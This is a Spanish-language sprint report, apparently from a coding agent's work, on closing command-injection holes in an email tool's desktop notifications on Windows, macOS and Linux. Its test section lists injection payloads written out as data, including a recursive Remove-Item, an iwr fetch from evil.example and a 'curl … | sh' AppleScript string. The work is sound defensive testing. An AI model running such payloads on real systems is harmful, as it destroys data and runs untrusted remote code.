# Sprint 12 — Emisión segura de notificaciones

Fecha: 2026-09-11 · Alcance: `src/email/notifications.py`, `src/email/cli.py` (invocación), documentación. Sin red, sin cuentas reales, sin tareas en background, sin commit.

## 1. Auditoría (estado previo)

`_desktop_notify` en `src/email/notifications.py:83-93` tenía tres vectores reales de ejecución de código con un asunto hostil recibido por IMAP:

| Plataforma | Antes | Riesgo |
|---|---|---|
| Windows | `powershell -NoProfile -Command <script> title body` | PowerShell re-parsea la línea de comandos tras `-Command`: un asunto con `"; Remove-Item ...` ejecutaba comandos arbitrarios |
| macOS | `osascript -e "display notification %r with title %r" % (body, title)` | `%r` es repr de Python, no literal AppleScript: comillas o saltos de línea rompían el literal y permitían AppleScript arbitrario (`do shell script`) |
| Linux | `notify-send title body` | Argumental (sin shell), pero sin `--`: un asunto `--urgency=...` era inyección de opciones |

La lógica de reglas (`notification_matches`, texto + `para:`), deduplicación por `raw_sha256`, estado persistente (`notification-state.json`, tope 5000) y fallos genéricos (el CLI imprime `error: no se pudieron emitir notificaciones`, `src/email/cli.py:726-729`) eran correctos y se mantuvieron.

## 2. Corrección

`_desktop_notify` ahora usa **script constante + datos por canal de datos**, sin shell (`shell` nunca presente) y sin concatenar datos no confiables en scripts:

- **Windows**: `powershell -NoProfile -NonInteractive -EncodedCommand <base64 UTF-16LE del script constante>`. El script (`_WINDOWS_SCRIPT`) solo lee `$env:EMAIL_AGENT_NOTIFY_TITLE` / `$env:EMAIL_AGENT_NOTIFY_BODY`; el texto viaja en el bloque de entorno (nunca se parsea como código) y `-EncodedCommand` elimina incluso el re-parseo de la línea de comandos. Se conserva el popup `WScript.Shell.Popup` con autodescarte a 5 s.
- **macOS**: `osascript -e <AppleScript constante>` (`_MACOS_SCRIPT`) que lee `system attribute "EMAIL_AGENT_NOTIFY_*"` desde el entorno heredado.
- **Linux**: `notify-send -- <title> <body>` — el `--` impide inyección de opciones.

### `notify_new_records`

- Se ignoran registros que no sean `dict` (antes: `AttributeError`).
- Un fallo del notificador ya no aborta el ciclo: los éxitos se marcan y se **persisten**, los fallidos **no** se marcan (se reintentan en el ciclo siguiente) y al final se lanza `RuntimeError("fallo al emitir notificaciones")` — mensaje genérico, sin detalle del binario ni datos del correo, que el CLI ya envuelve.
- El asunto vacío sigue cayendo al fallback `Nuevo correo`; título fijo `Email Agent`. Las reglas (texto y `para:`, `enabled`), dedup por hash y tope de estado quedan intactos.

## 3. Pruebas frozen

`outputs/email-agent-kdd/tests/frozen_notifications.py` — 37 pruebas, 100 % offline: el único punto de inyección es `subprocess.Popen` (stub que registra argv/env/kw) y `platform.system`; las reglas usan el almacén real en `tmp_path`.

- **Inyección (10 cargas × Windows y macOS)**: `"; Remove-Item C:\ -Recurse; #`, `$(Start-Process calc.exe)`, `$(iwr http://evil.example/x)`, backticks, `"; do shell script "curl … | sh"; "`, `--urgency=critical`, saltos/NUL/tab: se verifica que el payload **no aparece en ningún script** (el de Windows se decodifica de `-EncodedCommand` y se compara contra la constante) y que llega íntacto por env/argv; `shell` nunca en los kwargs.
- **Linux**: argv exacto `["notify-send", "--", "Email Agent", payload]`.
- **Unicode** (3 plataformas): `№ — € ✔ 日本語 📧 Ñoño` llega byte-igual como dato.
- **Reglas/texto**: regla deshabilitada no notifica; `para:` + texto combinados; fallback de asunto vacío; registros no-dict y hashes vacíos ignorados.
- **Deduplicación y estado**: mismo hash dentro de la corrida y entre corridas; estado persistente (`{"sent": [h1, h2]}`); se escribe estado incluso sin coincidencias; tope de 5000 conserva los hashes más recientes.
- **Fallos genéricos**: notificador que lanza → `RuntimeError("fallo al emitir notificaciones")` sin datos del correo en el mensaje; fallo parcial persiste éxitos y reintenta el fallido; binario ausente (`FileNotFoundError` del stub) → mismo genérico; fallo al escribir estado propaga `OSError`.

Resultado: **37 passed**. Suite completa: **830 passed** (0 failed, ~5,5 s).

## 4. Documentación

- `README.md` (§ Búsqueda y notificaciones): nueva párrafo sobre emisión sin shell/interpolación, dato por env/`--`, fallos genéricos y reintento.
- `SECURITY.md`: nueva viñeta con la garantía por plataforma y la política de fallo genérico.
- `plugins/email-agent/skills/email-agent/SKILL.md` (§ Notifications): regla equivalente para agentes.
- `CHANGELOG.md`: entrada `Corregido (sprint 12 — 2026-09-11)`.

## 5. Verificación

```
python -m pytest outputs/email-agent-kdd/tests/frozen_notifications.py -q  → 37 passed
python -m pytest -q                                                       → 830 passed
```

No se ejecutaron procesos nativos, no hubo red, no se modificaron cuentas ni credenciales; no se hizo commit/push ni publicación.